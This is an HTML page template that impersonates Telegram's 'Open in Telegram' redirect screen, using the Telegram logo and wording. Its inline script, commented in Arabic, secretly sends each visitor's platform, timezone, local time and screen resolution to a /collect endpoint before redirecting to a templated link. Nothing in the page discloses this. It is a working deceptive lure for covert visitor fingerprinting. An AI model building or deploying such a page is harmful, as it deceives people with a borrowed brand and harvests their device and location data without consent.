<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Telegram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#0088cc">
  <link rel="stylesheet" href="/static/style.css" />
  <link rel="icon" href="https://telegram.org/favicon.ico" />
</head>
<body>
  <div class="page">
    <div class="telegram-box">
      <img src="https://telegram.org/img/t_logo.png" class="telegram-logo" alt="Telegram Logo" />
      <h1 class="title">Open Telegram?</h1>
      <p class="subtitle">This link will open in Telegram.</p>
      <a id="openButton" class="open-button" href="#">Open in Telegram</a>
      <p class="waiting">Redirecting... please wait</p>
    </div>
  </div>
<script>
  const goto = "{{ goto }}";

  // إرسال البيانات إلى /collect
  async function sendVisitorData() {
    try {
      const data = {
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toString(),
        screen: `${screen.width}x${screen.height}`
      };

      await fetch("/collect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    } catch (e) {
      console.error("Data collection failed:", e);
    }
  }

  // إرسال البيانات ثم التحويل
  sendVisitorData().then(() => {
    setTimeout(() => {
      window.location.href = goto;
    }, 1600);
  });
</script>

  
</body>
</html>
 
